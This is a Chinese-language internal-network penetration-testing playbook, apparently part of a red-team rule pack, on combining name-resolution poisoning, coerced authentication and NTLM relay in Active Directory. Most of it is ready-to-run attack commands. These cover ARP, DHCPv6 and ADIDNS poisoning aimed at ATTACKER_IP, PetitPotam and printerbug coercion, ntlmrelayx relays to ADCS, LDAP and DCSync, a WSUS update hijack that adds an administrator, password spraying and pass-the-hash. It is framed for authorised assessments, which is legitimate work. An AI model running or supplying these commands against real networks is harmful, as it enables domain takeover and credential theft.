# 凭据、中继与投毒

> 适用：内网同广播域或已握有域凭据，需要把名字解析投毒、强制认证与 NTLM 中继组合成"不靠口令的认证复用"的授权评估。

## 认什么

| 面 | 判据 | 决定什么 |
|---|---|---|
| SMB 签名 | `--gen-relay-list` 未收录；`smb2-security-mode` 报 "enabled but not required" | 可中继到 SMB |
| LDAP 签名/EPA | LDAP signing 未强制、LDAPS 无 EPA | 可中继到 LDAP（RBCD/Shadow Credentials） |
| ADCS Web Enrollment | `curl -sk https://CA/certsrv/` 401/登录页；`netexec ldap -M adcs` | 可走 ESC8 |
| WebClient | `netexec smb -M webdav`、`rpcdump.py ... \| grep -i webclient` | WebDAV 强制认证（HTTP 无签名） |
| 强制认证服务 | Print Spooler(MS-RPRN)/EFS(MS-EFSR)/DFS(MS-DFSNM)/FSRVP(MS-FSRVP) | 触发器选型 |
| 网络位置 | 同广播域、IPv6 未禁用、有 DHCP | ARP/DHCPv6 投毒可做 |
| ADIDNS | 域用户可建 DNS 子对象 | 最稳的通配符投毒 |
| WPAD | DHCP 252 / DNS wpad / LLMNR 任一环节 | 透明代理抓认证 |
| WSUS | `reg query ...\WindowsUpdate /v wuserver` 为 `http://` | 更新包替换（代码执行） |
| 锁定策略 | `net accounts /domain`、`--pass-pol` | 喷洒次数上限 |
| 已有材料 | NetNTLMv2 / 明文 / NT hash | 决定中继还是破解 |

## 打哪（命令）

**前置侦察**

```bash
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
nmap -p 445 --script smb2-security-mode 10.0.0.0/24
netexec ldap DC_IP -u USER -p PASS -M adcs
curl -sk https://CA_SERVER/certsrv/
```

**投毒与 MITM**

```bash
bettercap -iface eth0
# 交互内：set arp.spoof.targets CLIENT_IP / set arp.spoof.fullduplex true / arp.spoof on
sysctl -w net.ipv4.ip_forward=1 && iptables --policy FORWARD ACCEPT
# any.proxy 把 SMB 流量拉到攻击机：src_address SERVER_IP / src_port 445 / dst_address ATTACKER_IP / dst_port 445 / any.proxy on
responder -I eth0 -dwPv            # 抓 NetNTLMv2 → hashcat -m 5600
responder -I eth0 -wPdD            # DHCP 注入 DNS+WPAD
mitm6 --interface eth0 --domain DOMAIN --host-allowlist TARGET_HOSTNAME
dnschef --fakeip ATTACKER_IP --interface ATTACKER_IP --port 53
dnstool.py -u 'DOMAIN\USER' -p PASS --record '*' --action add --data ATTACKER_IP DC
dnstool.py -u 'DOMAIN\USER' -p PASS --record '*' --action remove DC      # 收工清理
python3 pywsus.py --host ATTACKER_IP --port 8530 --executable /path/to/PsExec64.exe \
  --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\USER /add"'
```

```powershell
Invoke-Inveigh -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
New-ADIDNSNode -Node * -Data ATTACKER_IP
```

**强制认证**

```bash
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
python3 shadowcoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
coercer scan -t TARGET_IP -u USER -p PASS -d DOMAIN
coercer coerce -t TARGET_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN
```

**中继**

```bash
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target DC_HOSTNAME$
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user MACHINE$
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf relay_targets.txt -smb2support -e payload.exe
ntlmrelayx.py -t dcsync://DC2 -smb2support            # 双 DC 场景
# 经典组合：mitm6 -d DOMAIN + ntlmrelayx -t ldaps://DC -wh wpad.DOMAIN --delegate-access
```

**喷洒与复用**

```bash
netexec ldap DC_IP -u USER -p PASS --pass-pol
net accounts /domain
netexec smb DC_IP -u userlist.txt -p 'Company2024!' --continue-on-success
netexec winrm DC_IP -u userlist.txt -p 'Password1!' --continue-on-success
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password1!'
netexec smb SUBNET/24 -u administrator -H NT_HASH --local-auth
xfreerdp /v:TARGET /u:administrator /pth:HASH
hashcat -m 5600 netntlmv2.txt wordlist.txt
```

## 什么算成

- 中继到 ADCS：ntlmrelayx 出现 `Authenticating against http://CA ... SUCCEED` + `GOT CERTIFICATE`，落 Base64 证书 → `certipy auth` 出 hash
- 中继到 LDAP：RBCD / Shadow Credential 属性写入成功，后续 S4U 或证书换到 TGT
- 中继到 SMB 且账户是管理员：`-c "whoami"` 有回显
- 投毒到位：目标流量经攻击机（any.proxy 计数/抓包可见），或 ADIDNS 通配符让不存在的主机名解析到攻击机（`nslookup` 自证）
- Responder 收到 NetNTLMv2，且 `hashcat -m 5600` 破出明文
- 喷洒命中：认证成功并能执行命令（`(Pwn3d!)`），且命中前确认未超阈值

## 假点

- 抓到 NTLM 认证 ≠ 能中继：目标要 SMB signing 或 EPA 时中继必失败，先用 `--gen-relay-list`/`smb2-security-mode` 确认
- 抓到 NetNTLMv2 且不可中继，就只剩离线破解；破不出不算"拿到权限"
- mitm6 分到 IPv6 DNS 但目标不认证：目标禁用 IPv6、WPAD 已有记录、或 ACL 挡住，别当"已 MITM"
- ARP 投毒"成功"但流量不过攻击机：单向或未开 `ip_forward`；用 any.proxy 计数或抓包验证
- ADIDNS 通配符写成功但解析不生效：域内已有同名记录，或存在 WINS forward lookup（type 65281）干扰通配符
- 中继拿到的证书模板不是 `DomainController` 时，只能得到该机器/用户账户权限，不等于域控
- 喷洒返回"有效"只说明口令对；是否管理员、能否横向要单独验证
- `kerbrute` 的卖点是更快、日志更少，不代表不消耗失败计数：阈值仍按 `net accounts /domain` 算
- PTH 不经过密码校验、不触发锁定（实测结论），而喷洒会；两者别混着当"安全手段"

## 与其他包联动

- `signing:False` 清单与域结构来自 `internal-01`；ADCS 与 RBCD 前置见 `internal-03`；中继后的落地与 PTH/PTT 见 `internal-05`
- 跨网段投毒与代理位移见 `internal-06`；初始凭据来自 `web-auth-access`，云主机凭据接 `cloud-infra`；报告按 `../../../../rules/40-evidence-report.md`
